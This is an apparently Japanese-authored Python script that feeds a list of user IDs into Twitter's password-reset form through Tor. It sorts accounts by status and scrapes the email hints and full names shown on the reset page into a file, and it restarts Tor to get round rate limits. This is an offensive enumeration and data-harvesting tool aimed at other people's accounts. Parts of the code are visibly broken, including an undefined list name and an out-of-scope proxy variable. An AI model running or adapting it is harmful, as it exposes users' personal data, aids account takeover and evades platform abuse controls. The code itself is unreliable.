from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from mechanize import Browser
import subprocess
import requests
import base64
import socks
import socket
import time
import sys

# ~ フロー ~
# idlist.txtからユーザーIDを読み込む
# main関数実行　並列化
# pwReset.txt, protect.txtに書き込む

# NOTE #
# プロキシのタイムアウト時間は5分
# proxy_tester.pyの中にパスリセTor.pyを入れた感じ。
# 最終手段 - 複数のラズパイで共有サーバーを使って複数のtorを実行するか、ハイパーバイザーでtorを複数実行する
# inetip.infoにはVioletnorthが搭載されていてDDoS攻撃を防ぐために特定のIPは弾いています。

keywords_list = ["Request help signing in to your account."]

protect_list = [
    "個人情報を確認してください",
    "Verify your personal information",
    "Gwirio eich gwybodaeth bersonol",
    "Verifiziere Deine persönlichen Informationen.",
]

# エラーリスト
error_list = [
    "We hebben je account niet gevonden met deze informatie.",
    "Wir konnten Deinen Account mit diesen Angaben nicht finden.",
    "Potrzebujemy tej informacji, aby znaleźć Twoje konto.",
    "Nous n'avons pas trouvé votre compte avec ces informations.",
    "入力された情報ではアカウントが見つかりませんでした。",
    "We couldn't find your account with that information.",
    "VNie znaleźliśmy Twojego konta z tą informacją.",
    "No pudimos encontrar tu cuenta con esa información.",
]

# 規制リスト
regulation_list = [
    "Réinitialisation du mot de passe",
    "Passwortrücksetzung",
    "Wachtwoordherstel",
    "Password Reset",
    "パスワードをリセット",
    "Restablecimiento de contraseña",
    "Lösenordsåterställning",
    "Resetowanie hasła",
    "Salasanan nollaus",
    "Сброс пароля",
]

# パスワードリセット
pwReset       = []
# 保護済み
protected     = []

# -------------- 設定 -------------- #

# IDリストファイルパス
idlistPath    = "idlist.txt"
# パスワードリセットファイルパス
pwResetPath   = "pwReset.txt"
# 保護済みファイルパス
protectedPath = "protected.txt"
# プロキシリストファイルパス
proxylistPath = "proxylist.txt"
# 最高スレッド数
max_thread    = 3

# ---------------------------------- #

# プロキシリストの読み込み
with open(proxylistPath, "r") as f:
    proxylist = f.read().splitlines()



def thread(id, retry=5):

    for _ in range(retry):

        try:

            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket

            br = Browser()
            br.set_handle_robots(False)
            br.addheaders = [("User-agent", "Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)")]

            # ------------------------------ スクレイピング ------------------------------ #
            br.open("https://twitter.com/account/begin_password_reset", timeout=10.0)
            br.select_form(action="/account/begin_password_reset")
            br["account_identifier"] = id
            br.submit()

            html = BeautifulSoup(br.response().read(), "html.parser")
            title = html.find("title").text
            body = html.find("body").text

            for error in error_list:
                if error in body:
                    print("\n{},入力された情報ではアカウントが見つかりませんでした。".format(id))
                    print("\n--------------------------------")
                    break
                else:
                    for keyword in keywords_list:
                        if keyword in title:
                            print("\n{},パスリセメソッド不在".format(id))
                            print("\n--------------------------------")
                            break

                    else:
                        for protect in protect_list:
                            if protect in body:
                                print("\n{},保護済み".format(id))
                                print("\n--------------------------------")
                                break
                        else:
                            soupobject = BeautifulSoup(br.response().read(), "html.parser")
                            mailaddresses = soupobject.find_all("strong")
                            fullname = soupobject.find_all("b")

                            if mailaddresses == []:
                                print("\n" + id + ",規制\n")
                                subprocess.run("taskkill /IM tor.exe /F")
                                print("\n--------------------------------")
                                subprocess.Popen("tor")
                                res = requests.get(
                                    "http://inet-ip.info/ip", proxies=proxies
                                )
                                print("\n" + res.text)
                                break

                            else:
                                willwritedata = id

                                for mailaddress in mailaddresses:
                                    willwritedata += "," + mailaddress.text

                                for fullname in fullname:
                                    fullname = fullname.text

                                print("\n" + fullname)
                                print(willwritedata + "\n")
                                パスリセ.append(fullname + "," + willwritedata + "\n")
                                print("--------------------------------")
                            break
                        break
                    break
                break
            break
            # ----------------------------------------------------------------------------- #

        except KeyboardInterrupt:
            print("強制終了")
            #subprocess.run("taskkill /IM tor.exe /F")

            # ----------------------書き込み------------------------ #
            with open(pwResetPath, "w", encoding="utf-8") as f:
                f.write("\n".join(pwReset))

            with open(protectedPath, "w", encoding="utf-8") as f:
                f.write("\n".join(protected))
            # ----------------------------------------------------- #
            print("\n終了")
            input()
            exit()

        # - Tor終了
        subprocess.run("taskkill /IM tor.exe /F")

        # ----------------------書き込み------------------------ #
        with open(pwResetPath, "w", encoding="utf-8") as f:
            f.write("\n".join(pwReset))

        with open(protectedPath, "w", encoding="utf-8") as f:
            f.write("\n".join(protected))
        # ----------------------------------------------------- #

        print("\n終了")
        input()
        exit()


def main(ids, retry=5):

    # スレッド設定
    th = ThreadPoolExecutor(max_workers=max_thread)

    # - tor呼び出し
    subprocess.Popen("tor")

    # - 自分のIPを表示
    proxies = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
    res = requests.get("http://inet-ip.info/ip", proxies=proxies)
    print(res.text)
    print()

    for id in ids:
        # スレッド実行
        th.submit(thread, id, retry)
    th.shutdown()

# IDリスト読み込み
with open(idlistPath, "r") as f:
    ids = f.read().splitlines() # 一行ずつ

# 関数実行
main(ids, retry=5)

# ----------------------書き込み------------------------ #
with open(pwResetPath, "w", encoding="utf-8") as f:
    f.write("\n".join(pwReset))
with open(protectedPath, "w", encoding="utf-8") as f:
    f.write("\n".join(protected))
# ----------------------------------------------------- #

# Tor終了
subprocess.run("taskkill /IM tor.exe /F")

print("\n終了")
input()
